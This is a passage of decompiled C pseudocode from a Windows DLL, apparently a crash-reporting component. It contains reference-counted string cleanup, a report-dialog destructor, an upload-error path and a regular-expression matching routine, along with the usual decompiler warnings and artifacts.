      local_8 = CONCAT31(local_8._1_3_,5);
      local_54 = piVar4;
      if (((local_58 == (int *)0x0) || (piVar5 = local_58 + 3, piVar5 == (int *)0x0)) ||
         ((char)*piVar5 == '\0')) {
        local_34 = (int *)0x0;
LAB_1000e22d:
        local_94 = (int *)0x0;
      }
      else {
        local_34 = (int *)FUN_1000c0a0(piVar5,0xffffffff);
        if (local_34 == (int *)0x0) goto LAB_1000e22d;
        local_94 = local_34 + 3;
      }
      piVar5 = local_34;
      if (piVar4 == (int *)0x0) {
        local_90 = 0;
        local_6c = (int *)0x0;
      }
      else {
        local_90 = piVar4[2];
        local_6c = piVar4 + 3;
      }
      if (*(int *)(local_18 + 0x34) == 0) {
        iVar7 = 0;
      }
      else {
        iVar7 = *(int *)(local_18 + 0x34) + 0xc;
      }
      FUN_10049c10(iVar7,&local_9c);
      if (piVar5 != (int *)0x0) {
        LOCK();
        iVar7 = *piVar5;
        *piVar5 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar7 = *piVar4;
        *piVar4 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      if (local_58 != (int *)0x0) {
        LOCK();
        iVar7 = *local_58;
        *local_58 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(local_58);
        }
      }
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar7 = *piVar3;
        *piVar3 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      if (local_20 != (int *)0x0) {
        LOCK();
        iVar7 = *local_20;
        *local_20 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(local_20);
        }
      }
      if (local_30 != (int *)0x0) {
        LOCK();
        iVar7 = *local_30;
        *local_30 = iVar7 + -1;
        UNLOCK();
        if (iVar7 + -1 < 0) {
          FUN_100579ee(local_30);
        }
      }
      *(int *)(local_18 + 0xc) = *(int *)(local_18 + 4);
      iVar7 = local_14;
      param_1 = local_18;
      if (*(int *)(local_18 + 4) != -1) {
        if (((*(int *)(local_18 + 8) == 0) ||
            (pcVar9 = (char *)(*(int *)(local_18 + 8) + 0xc), pcVar9 == (char *)0x0)) ||
           (*pcVar9 != '\0')) {
          piVar3 = (int *)FUN_100075b0();
        }
        else {
          piVar3 = (int *)FUN_10007ae0();
        }
        local_28 = (int *)0x0;
        local_8 = CONCAT31(local_8._1_3_,8);
        local_24 = piVar3;
        iVar7 = FUN_100110e0(&local_28);
        if (iVar7 != 0) {
          local_14 = local_14 + 1;
        }
        iVar7 = local_14;
        iVar6 = FUN_10011280(&local_4c);
        if (iVar6 != 0) {
          if (local_4c == 0x62) {
            local_14 = iVar7 + 1;
          }
          else {
            if (piVar3 == (int *)0x0) {
              piVar4 = (int *)0x0;
            }
            else {
              piVar4 = piVar3 + 3;
            }
            FUN_10006250("upload error: \'%s\'\n",piVar4);
          }
        }
        if (local_28 != (int *)0x0) {
          LOCK();
          iVar7 = *local_28;
          *local_28 = iVar7 + -1;
          UNLOCK();
          if (iVar7 + -1 < 0) {
            FUN_100579ee(local_28);
          }
        }
        iVar7 = local_14;
        param_1 = local_18;
        if (piVar3 != (int *)0x0) {
          LOCK();
          iVar6 = *piVar3;
          *piVar3 = iVar6 + -1;
          UNLOCK();
          if (iVar6 + -1 < 0) {
            FUN_100579ee(piVar3);
            iVar7 = local_14;
            param_1 = local_18;
          }
        }
      }
    }
    local_40[2] = local_40[2] + 1;
    if (1 < (uint)local_40[2]) {
      ExceptionList = local_10;
      return iVar7 == 2;
    }
  } while( true );
}



/* Function: FUN_1000e410 */

/* WARNING: Instruction at (ram,0x1000e41c) overlaps instruction at (ram,0x1000e419)
    */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * __fastcall FUN_1000e410(undefined4 *param_1)

{
  char *pcVar1;
  uint uVar2;
  undefined4 *puVar3;
  byte *extraout_ECX;
  char extraout_DH;
  undefined1 in_CF;
  undefined1 in_ZF;
  
  *param_1 = CMultiLingualDlgImpl<class_CSendReportDlg3>::vftable;
  uVar2 = FUN_105e5a15(param_1[5]);
  if ((bool)in_CF || (bool)in_ZF) {
    pcVar1 = (char *)(uVar2 ^ 0xf1e81008);
    if (pcVar1 != (char *)0x0) {
      *pcVar1 = *pcVar1 + (char)pcVar1;
      puVar3 = (undefined4 *)thunk_FUN_100579ee(param_1[3]);
      param_1[3] = 0;
      return puVar3;
    }
    *(char *)((int)param_1 + -10) = *(char *)((int)param_1 + -10) + extraout_DH;
    uVar2 = 0;
  }
  *extraout_ECX = *extraout_ECX | (byte)uVar2;
  _DAT_10096604 = 1;
  DAT_1009acd0 = 0;
  if (*extraout_ECX != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_1000e450 */

void __fastcall FUN_1000e450(int param_1)

{
  if (*(int *)(param_1 + 4) != 0) {
    FUN_100579ee(*(int *)(param_1 + 4));
  }
  return;
}



/* Function: FUN_1000e460 */

void __fastcall FUN_1000e460(int param_1)

{
  if (*(int *)(param_1 + 0x14) != 0) {
    FUN_100579ee(*(int *)(param_1 + 0x14));
  }
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 0x10));
  *(undefined4 *)(param_1 + 0x10) = 0;
  thunk_FUN_100579ee(*(undefined4 *)(param_1 + 0xc));
  *(undefined4 *)(param_1 + 0xc) = 0;
  return;
}



/* Function: FUN_1000e4a0 */

void __fastcall FUN_1000e4a0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = (int *)param_1[2];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[1];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1000e4f0 */

void __fastcall FUN_1000e4f0(int param_1)

{
  if (*(int *)(param_1 + 0xc) != 0) {
    thunk_FUN_100579ee(*(int *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
    *(undefined4 *)(param_1 + 0x10) = 0;
    *(undefined4 *)(param_1 + 0x14) = 0;
  }
  return;
}



/* Function: FUN_1000e520 */

int __fastcall FUN_1000e520(int param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074916;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 1;
  if (*(int *)(param_1 + 0x40a0) != 0) {
    FUN_10037e50(param_1);
  }
  piVar2 = *(int **)(param_1 + 0x4098);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2,uVar3);
    }
  }
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  thunk_FUN_100579ee(param_1);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1000e5b0 */

undefined4 __fastcall FUN_1000e5b0(int *param_1)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = *param_1;
  iVar2 = FUN_10010370(0,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    *param_1 = iVar3;
  }
  else {
    iVar3 = FUN_1004c2f0();
    if (iVar3 != 0) {
      bVar1 = true;
      *(int *)(*param_1 + 8) = *(int *)(*param_1 + 8) - iVar3;
      *(undefined2 *)(*param_1 + 0xc + *(int *)(*param_1 + 8) * 2) = 0;
      goto LAB_1000e5f0;
    }
  }
  bVar1 = false;
LAB_1000e5f0:
  iVar3 = *param_1;
  iVar2 = FUN_10010370(0,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    *param_1 = iVar3;
  }
  else {
    iVar3 = FUN_1004c220();
    if (iVar3 != 0) {
      *(int *)(*param_1 + 8) = *(int *)(*param_1 + 8) - iVar3;
      *(undefined2 *)(*param_1 + 0xc + *(int *)(*param_1 + 8) * 2) = 0;
      return 1;
    }
  }
  if (bVar1) {
    return 1;
  }
  return 0;
}



/* Function: FUN_1000e640 */

undefined4 * __thiscall FUN_1000e640(int *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (*param_1 == 0) {
    uVar1 = FUN_1000bd10();
    *param_2 = uVar1;
    return param_2;
  }
  uVar1 = FUN_1000bd10();
  *param_2 = uVar1;
  return param_2;
}



/* Function: FUN_1000e6a0 */

bool FUN_1000e6a0(void)

{
  char cVar1;
  
  cVar1 = FUN_1004b4e0();
  return cVar1 != '\0';
}



/* Function: FUN_1000e6d0 */

char * __thiscall FUN_1000e6d0(undefined4 *param_1,undefined4 *param_2)

{
  char *pcVar1;
  int iVar2;
  int *piVar3;
  char *pcVar4;
  
  pcVar4 = (char *)*param_2;
  if ((pcVar4 != (char *)0x0) && (*(int *)(pcVar4 + 8) != 0)) {
    pcVar1 = pcVar4 + 8;
    pcVar4 = pcVar4 + 0xc;
    if ((pcVar4 != (char *)0x0) && (*pcVar4 != '\0')) {
      pcVar4 = (char *)FUN_10010500(pcVar4,*(undefined4 *)pcVar1);
      *param_1 = pcVar4;
      return pcVar4;
    }
  }
  piVar3 = (int *)*param_1;
  if (piVar3 != (int *)0x0) {
    if (*piVar3 == 0) {
      piVar3[2] = 0;
      *(undefined2 *)(piVar3 + 3) = 0;
      *param_1 = piVar3;
      return (char *)0x0;
    }
    LOCK();
    iVar2 = *piVar3;
    pcVar4 = (char *)*piVar3;
    *piVar3 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      pcVar4 = (char *)FUN_100579ee(piVar3);
    }
  }
  *param_1 = 0;
  return pcVar4;
}



/* Function: FUN_1000e740 */

void __fastcall FUN_1000e740(undefined4 *param_1)

{
  thunk_FUN_100579ee(*param_1);
  *param_1 = 0;
  return;
}



/* Function: FUN_1000e760 */

undefined4 * __thiscall FUN_1000e760(int *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (*param_1 == 0) {
    uVar1 = FUN_100075b0();
    *param_2 = uVar1;
    return param_2;
  }
  uVar1 = FUN_100075b0();
  *param_2 = uVar1;
  return param_2;
}



/* Function: FUN_1000e7c0 */

undefined4 * __fastcall FUN_1000e7c0(undefined4 *param_1)

{
  undefined4 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  uVar1 = FUN_1000fa00(0,0);
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_1000e7e0 */

int __thiscall FUN_1000e7e0(int *param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *local_8;
  
  piVar1 = param_2;
  if (param_2 == (int *)0x0) {
    return 10;
  }
  if (param_1[1] != 0) {
    local_8 = param_1;
    FUN_100579ee(param_1[1]);
    param_1[1] = 0;
  }
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[6] = 0;
  param_1[5] = 0;
  *param_1 = 0;
  param_1[7] = 1;
  local_8 = piVar1;
  iVar2 = FUN_1000f110(0x10);
  if (-1 < iVar2) {
    if ((short)*local_8 == 0x5e) {
      iVar3 = FUN_1000f110(0x1c);
      if (iVar3 < 0) {
        return 1;
      }
      local_8 = (int *)((int)local_8 + 2);
    }
    else {
      iVar3 = FUN_1000f110(0x1d);
      if (iVar3 < 0) {
        return 1;
      }
    }
    param_2 = (int *)CONCAT13(1,param_2._0_3_);
    FUN_1000f1c0(&local_8,(int)&param_2 + 3);
    if (*param_1 == 0) {
      iVar2 = FUN_1000f1a0(iVar2);
      *(undefined4 *)(iVar2 + 4) = 2;
      iVar2 = FUN_1000f110(0x1e);
      if (iVar2 < 0) {
        return 1;
      }
    }
    return *param_1;
  }
  return 1;
}



/* Function: FUN_1000e8d0 */

/* WARNING: Control flow encountered bad instruction data */

undefined4 __thiscall FUN_1000e8d0(int param_1,wchar_t *param_2,int param_3,int *param_4)

{
  int *piVar1;
  wchar_t wVar2;
  uint uVar3;
  errno_t eVar4;
  undefined4 uVar5;
  int iVar6;
  wchar_t *pwVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  uint uVar11;
  wchar_t *local_18;
  wchar_t *local_14;
  wchar_t *local_10;
  
  if ((param_2 == (wchar_t *)0x0) || (param_3 == 0)) {
    return 0;
  }
  if (param_4 != (int *)0x0) {
    *param_4 = 0;
  }
  local_14 = param_2;
  if (*(int *)(param_1 + 0x1c) == 0) {
    pwVar7 = param_2;
    do {
      wVar2 = *pwVar7;
      pwVar7 = pwVar7 + 1;
    } while (wVar2 != L'\0');
    uVar11 = ((int)pwVar7 - (int)(param_2 + 1) >> 1) * 2 + 2;
    local_14 = (wchar_t *)FUN_100581b4(uVar11);
    if (local_14 == (wchar_t *)0x0) {
      return 0;
    }
    eVar4 = _memcpy_s(local_14,uVar11,param_2,uVar11);
    FUN_10007f40(eVar4);
    uVar5 = FUN_10058b10(local_14,uVar11 >> 1);
    FUN_10007f40(uVar5);
  }
  iVar6 = FUN_1000f2c0(*(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x14));
  if (iVar6 == 0) {
    if (local_14 == param_2) {
      return 0;
    }
    FUN_100579ee(local_14);
    return 0;
  }
  uVar11 = 0;
  piVar1 = (int *)(param_1 + 4);
  pwVar7 = local_14;
  local_18 = local_14;
  local_10 = local_14;
switchD_1000e9ba_caseD_9:
  if (uVar11 == 0) {
    *(wchar_t **)(param_3 + 4) = pwVar7;
  }
  if (*(uint *)(param_1 + 8) <= uVar11) {
LAB_1000ef17:
    FUN_10007f20(0x80070057);
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  switch(*(undefined4 *)(*piVar1 + uVar11 * 8)) {
  case 0:
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 1:
    iVar6 = *(int *)(param_3 + 0x10);
    iVar10 = FUN_1000f1a0(uVar11);
    *(wchar_t **)(iVar6 + *(int *)(iVar10 + 4) * 8) = pwVar7;
    goto LAB_1000ea04;
  case 2:
    iVar6 = *(int *)(param_3 + 0x10);
    iVar10 = FUN_1000f1a0(uVar11);
    uVar11 = uVar11 + 1;
    *(wchar_t **)(iVar6 + 4 + *(int *)(iVar10 + 4) * 8) = pwVar7;
    goto switchD_1000e9ba_caseD_9;
  case 3:
    iVar6 = FUN_1000f1a0(uVar11);
    if (*(uint *)(iVar6 + 4) != (uint)(ushort)*pwVar7) goto LAB_1000eca6;
    pwVar7 = pwVar7 + 1;
    uVar11 = uVar11 + 1;
    local_10 = pwVar7;
    goto switchD_1000e9ba_caseD_9;
  case 4:
    if (*pwVar7 != L'\0') {
      pwVar7 = pwVar7 + 1;
      uVar11 = uVar11 + 1;
      local_10 = pwVar7;
      goto switchD_1000e9ba_caseD_9;
    }
    break;
  case 5:
    if (*pwVar7 != L'\0') {
      iVar6 = FUN_10010be0(uVar11);
      if (((uint)*(ushort *)(iVar6 + 8 + (uint)((ushort)*pwVar7 >> 3) * 2) &
          1 << ((byte)*pwVar7 & 7)) == 0) goto LAB_1000ebd9;
      uVar11 = uVar11 + 5;
      pwVar7 = pwVar7 + 1;
      local_10 = pwVar7;
      goto switchD_1000e9ba_caseD_9;
    }
    break;
  case 6:
    if (*pwVar7 == L'\0') {
      uVar11 = FUN_1000f400();
    }
    else {
      iVar6 = FUN_10010be0(uVar11);
      if (((uint)*(ushort *)(iVar6 + 8 + (uint)((ushort)*pwVar7 >> 3) * 2) &
          1 << ((byte)*pwVar7 & 7)) == 0) {
        uVar11 = uVar11 + 5;
        pwVar7 = pwVar7 + 1;
        local_10 = pwVar7;
      }
      else {
        uVar11 = FUN_1000f400();
      }
    }
    goto switchD_1000e9ba_caseD_9;
  case 7:
    if (*pwVar7 == L'\0') {
      uVar11 = FUN_1000f400();
    }
    else {
      iVar6 = FUN_1000f1a0(uVar11);
      uVar3 = *(uint *)(iVar6 + 4);
      for (uVar11 = uVar11 + 1; uVar11 < uVar3; uVar11 = uVar11 + 2) {
        if (*(uint *)(param_1 + 8) <= uVar11) goto LAB_1000ef17;
        if ((*(uint *)(*piVar1 + 4 + uVar11 * 8) <= (uint)(ushort)*pwVar7) &&
           (iVar6 = FUN_1000f1a0(uVar11 + 1), (uint)(ushort)*pwVar7 <= *(uint *)(iVar6 + 4))) {
          pwVar7 = pwVar7 + 1;
          uVar11 = uVar3;
          local_10 = pwVar7;
          goto switchD_1000e9ba_caseD_9;
        }
      }
LAB_1000eca6:
      uVar11 = FUN_1000f400();
    }
    goto switchD_1000e9ba_caseD_9;
  case 8:
    if (*pwVar7 == L'\0') {
      uVar11 = FUN_1000f400();
    }
    else {
      iVar6 = FUN_1000f1a0(uVar11);
      uVar3 = *(uint *)(iVar6 + 4);
      for (uVar11 = uVar11 + 1; uVar11 < uVar3; uVar11 = uVar11 + 2) {
        if (*(uint *)(param_1 + 8) <= uVar11) goto LAB_1000ef17;
        if ((*(uint *)(*piVar1 + 4 + uVar11 * 8) <= (uint)(ushort)*pwVar7) &&
           (iVar6 = FUN_1000f1a0(uVar11 + 1), (uint)(ushort)*pwVar7 <= *(uint *)(iVar6 + 4)))
        goto LAB_1000eca6;
      }
      pwVar7 = pwVar7 + 1;
      local_10 = pwVar7;
    }
  default:
    goto switchD_1000e9ba_caseD_9;
  case 0xd:
    iVar6 = FUN_1000f1a0(uVar11);
    uVar11 = *(uint *)(iVar6 + 4);
    goto switchD_1000e9ba_caseD_9;
  case 0xe:
    FUN_1000f360(pwVar7);
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0xf:
    pwVar7 = (wchar_t *)FUN_1000f400();
    uVar11 = uVar11 + 1;
    local_10 = pwVar7;
    goto switchD_1000e9ba_caseD_9;
  case 0x10:
    FUN_1000f360(uVar11 + 1);
    iVar6 = FUN_1000f1a0(uVar11);
    uVar11 = *(uint *)(iVar6 + 4);
    goto switchD_1000e9ba_caseD_9;
  case 0x11:
    break;
  case 0x14:
    iVar6 = *(int *)(param_3 + 0xc);
    iVar10 = FUN_1000f1a0(uVar11);
    FUN_1000f360(*(undefined4 *)(iVar6 + *(int *)(iVar10 + 4) * 4));
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0x15:
    iVar6 = *(int *)(param_3 + 0xc);
    uVar5 = FUN_1000f400();
    iVar10 = FUN_1000f1a0(uVar11);
    *(undefined4 *)(iVar6 + *(int *)(iVar10 + 4) * 4) = uVar5;
    pwVar7 = local_10;
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0x16:
    iVar6 = *(int *)(param_3 + 0xc);
    iVar10 = FUN_1000f1a0(uVar11);
    *(wchar_t **)(iVar6 + *(int *)(iVar10 + 4) * 4) = pwVar7;
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0x17:
    iVar6 = *(int *)(param_3 + 0xc);
    iVar10 = FUN_1000f1a0(uVar11);
    *(undefined4 *)(iVar6 + *(int *)(iVar10 + 4) * 4) = *(undefined4 *)(param_3 + 0x24);
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0x18:
    iVar6 = *(int *)(param_3 + 0xc);
    iVar10 = FUN_1000f1a0(uVar11);
    uVar11 = uVar11 + 1;
    pwVar7 = *(wchar_t **)(iVar6 + *(int *)(iVar10 + 4) * 4);
    local_10 = pwVar7;
    goto switchD_1000e9ba_caseD_9;
  case 0x19:
    iVar6 = *(int *)(param_3 + 0xc);
    iVar10 = FUN_1000f1a0(uVar11);
    *(undefined4 *)(param_3 + 0x24) = *(undefined4 *)(iVar6 + *(int *)(iVar10 + 4) * 4);
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0x1a:
    iVar6 = *(int *)(param_3 + 0xc);
    iVar10 = FUN_1000f1a0(uVar11);
    if (pwVar7 == *(wchar_t **)(iVar6 + *(int *)(iVar10 + 4) * 4)) {
      uVar11 = FUN_1000f400();
    }
    else {
LAB_1000ea04:
      uVar11 = uVar11 + 1;
    }
    goto switchD_1000e9ba_caseD_9;
  case 0x1b:
    iVar6 = *(int *)(param_3 + 0x10);
    if (*(int *)(param_1 + 0x1c) == 0) {
      iVar10 = FUN_1000f1a0(uVar11);
      iVar10 = *(int *)(iVar10 + 4);
      iVar8 = FUN_1000f1a0(uVar11);
      iVar8 = *(int *)(iVar6 + 4 + *(int *)(iVar8 + 4) * 8);
      iVar10 = *(int *)(iVar6 + iVar10 * 8);
      iVar9 = FUN_1000f1a0(uVar11);
      iVar6 = FUN_100595b7(local_10,*(undefined4 *)(iVar6 + *(int *)(iVar9 + 4) * 8),
                           iVar8 - iVar10 >> 1);
    }
    else {
      iVar10 = FUN_1000f1a0(uVar11);
      iVar10 = *(int *)(iVar10 + 4);
      iVar8 = FUN_1000f1a0(uVar11);
      iVar8 = *(int *)(iVar6 + 4 + *(int *)(iVar8 + 4) * 8);
      iVar10 = *(int *)(iVar6 + iVar10 * 8);
      iVar9 = FUN_1000f1a0(uVar11);
      iVar6 = _wcsncmp(local_10,*(wchar_t **)(iVar6 + *(int *)(iVar9 + 4) * 8),iVar8 - iVar10 >> 1);
    }
    pwVar7 = local_10;
    if (iVar6 == 0) {
      iVar6 = *(int *)(param_3 + 0x10);
      iVar10 = FUN_1000f1a0(uVar11);
      iVar10 = *(int *)(iVar10 + 4);
      iVar8 = FUN_1000f1a0(uVar11);
      uVar11 = uVar11 + 1;
      pwVar7 = local_10 +
               (*(int *)(iVar6 + 4 + *(int *)(iVar8 + 4) * 8) - *(int *)(iVar6 + iVar10 * 8) >> 1);
      local_10 = pwVar7;
    }
    else {
LAB_1000ebd9:
      uVar11 = FUN_1000f400();
    }
    goto switchD_1000e9ba_caseD_9;
  case 0x1c:
    goto switchD_1000e9ba_caseD_1c;
  case 0x1d:
    pwVar7 = local_18 + 1;
    if (*pwVar7 == L'\0') goto switchD_1000e9ba_caseD_1c;
    *(undefined4 *)(param_3 + 0x24) = 0;
    uVar11 = 0;
    local_18 = pwVar7;
    local_10 = pwVar7;
    goto switchD_1000e9ba_caseD_9;
  case 0x1e:
    *(wchar_t **)(param_3 + 8) = pwVar7;
    if (*(int *)(param_1 + 0x1c) == 0) {
      FUN_1000f240(param_3,param_2,local_14);
    }
    if (param_4 != (int *)0x0) {
      *param_4 = (int)(param_2 + ((int)pwVar7 - (int)local_14 >> 1));
    }
    if (local_14 != param_2) {
      FUN_100579ee(local_14);
    }
    return 1;
  case 0x1f:
    iVar6 = *(int *)(param_3 + 0x10);
    iVar10 = FUN_1000f1a0(uVar11);
    FUN_1000f360(*(undefined4 *)(iVar6 + *(int *)(iVar10 + 4) * 8));
    iVar6 = *(int *)(param_3 + 0x10);
    iVar10 = FUN_1000f1a0(uVar11);
    FUN_1000f360(*(undefined4 *)(iVar6 + 4 + *(int *)(iVar10 + 4) * 8));
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  case 0x20:
    iVar6 = *(int *)(param_3 + 0x10);
    uVar5 = FUN_1000f400();
    iVar10 = FUN_1000f1a0(uVar11);
    *(undefined4 *)(iVar6 + 4 + *(int *)(iVar10 + 4) * 8) = uVar5;
    iVar6 = *(int *)(param_3 + 0x10);
    uVar5 = FUN_1000f400();
    iVar10 = FUN_1000f1a0(uVar11);
    *(undefined4 *)(iVar6 + *(int *)(iVar10 + 4) * 8) = uVar5;
    pwVar7 = local_10;
    uVar11 = uVar11 + 1;
    goto switchD_1000e9ba_caseD_9;
  }
  uVar11 = FUN_1000f400();
  goto switchD_1000e9ba_caseD_9;
switchD_1000e9ba_caseD_1c:
  *(wchar_t **)(param_3 + 8) = pwVar7;
  if (*(int *)(param_1 + 0x1c) == 0) {
    FUN_1000f240(param_3,param_2,local_14);
  }
  if (param_4 != (int *)0x0) {
    *param_4 = (int)(param_2 + ((int)pwVar7 - (int)local_14 >> 1));
  }
  if (local_14 == param_2) {
    return 0;
  }
  FUN_100579ee(local_14);
  return 0;
}



/* Function: FUN_1000efb0 */

void __thiscall FUN_1000efb0(uint *param_1,uint param_2,undefined4 *param_3,undefined4 *param_4)

{
  code *pcVar1;
  
  if (param_3 == (undefined4 *)0x0) {
    FUN_10007f20(0x80004005);
  }
  else if (param_4 != (undefined4 *)0x0) {
    if (param_2 < *param_1) {
      *param_3 = *(undefined4 *)(param_1[4] + param_2 * 8);
      *param_4 = *(undefined4 *)(param_1[4] + 4 + param_2 * 8);
      return;
    }
    goto LAB_1000eff5;
  }
  FUN_10007f20(0x80004005);
LAB_1000eff5:
  FUN_10007f20(0x80004005);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_1000f000 */

undefined4 * __fastcall FUN_1000f000(undefined4 *param_1)

{
  char cVar1;
  uint uVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074961;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  local_8 = 2;
  *param_1 = 0;
  param_1[9] = 0;
  if ((uint)param_1[7] < 0x400) {
    cVar1 = FUN_10010600(0x400);
    if (cVar1 == '\0') goto LAB_1000f09d;
LAB_1000f091:
    FUN_10006250(uVar2);
  }
  else if ((uint)param_1[6] < 0x400) goto LAB_1000f091;
  param_1[6] = 0x400;
LAB_1000f09d:
  param_1[1] = 0;
  param_1[2] = 0;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1000f0c0 */

uint __fastcall FUN_1000f0c0(int *param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  
  iVar1 = *param_1;
  iVar2 = FUN_10010370(0,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    *param_1 = iVar1;
    uVar3 = 0;
  }
  else {
    uVar3 = FUN_1004c220();
    if (uVar3 != 0) {
      *(int *)(*param_1 + 8) = *(int *)(*param_1 + 8) - uVar3;
      iVar1 = *(int *)(*param_1 + 8);
      *(undefined2 *)(*param_1 + 0xc + iVar1 * 2) = 0;
      return CONCAT31((int3)((uint)iVar1 >> 8),1);
    }
  }
  return uVar3 & 0xffffff00;
}



/* Function: FUN_1000f110 */

int __thiscall FUN_1000f110(undefined4 *param_1,undefined4 param_2)

{
  code *pcVar1;
  char cVar2;
  int iVar3;
  uint uVar4;
  
  uVar4 = param_1[2] + 1;
  if (uVar4 == 0) {
    if (param_1[1] != 0) {
      FUN_100579ee(param_1[1]);
      param_1[1] = 0;
    }
    param_1[2] = 0;
    param_1[3] = 0;
    goto LAB_1000f162;
  }
  if ((uint)param_1[3] < uVar4) {
    cVar2 = FUN_10013ef0(uVar4);
    if (cVar2 == '\0') {
      *param_1 = 1;
      return -1;
    }
LAB_1000f15a:
    FUN_10006250();
  }
  else if ((uint)param_1[2] < uVar4) goto LAB_1000f15a;
  param_1[2] = uVar4;
LAB_1000f162:
  if ((uint)param_1[2] <= param_1[2] - 1) {
    FUN_10007f20(0x80070057);
    pcVar1 = (code *)swi(3);
    iVar3 = (*pcVar1)();
    return iVar3;
  }
  *(undefined4 *)(param_1[1] + (param_1[2] - 1) * 8) = param_2;
  return param_1[2] + -1;
}



/* Function: FUN_1000f1a0 */

int __thiscall FUN_1000f1a0(int param_1,uint param_2)

{
  code *pcVar1;
  int iVar2;
  
  if (param_2 < *(uint *)(param_1 + 8)) {
    return *(int *)(param_1 + 4) + param_2 * 8;
  }
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  iVar2 = (*pcVar1)();
  return iVar2;
}



/* Function: FUN_1000f1c0 */

int __thiscall FUN_1000f1c0(int *param_1,undefined4 *param_2,char *param_3)

{
  undefined4 *puVar1;
  char *pcVar2;
  int iVar3;
  
  pcVar2 = param_3;
  puVar1 = param_2;
  if (*(short *)*param_2 == 0) {
    return -1;
  }
  iVar3 = FUN_1000f470(param_2,param_3);
  if (-1 < iVar3) {
    param_2._3_1_ = '\x01';
    FUN_1000f1c0(puVar1,(int)&param_2 + 3);
    if (*param_1 != 0) {
      return -1;
    }
    if ((*pcVar2 != '\0') && (param_2._3_1_ != '\0')) {
      *pcVar2 = '\x01';
      return iVar3;
    }
    *pcVar2 = '\0';
  }
  return iVar3;
}



/* Function: FUN_1000f240 */

void FUN_1000f240(uint *param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  code *pcVar3;
  uint uVar4;
  
  if (param_1 != (uint *)0x0) {
    param_1[1] = param_2 + ((int)(param_1[1] - param_3) >> 1) * 2;
    param_1[2] = param_2 + ((int)(param_1[2] - param_3) >> 1) * 2;
    uVar4 = 0;
    if (*param_1 != 0) {
      do {
        piVar1 = (int *)(param_1[4] + uVar4 * 8);
        if ((*piVar1 != 0) && (piVar1[1] != 0)) {
          *piVar1 = param_2 + (*piVar1 - param_3 >> 1) * 2;
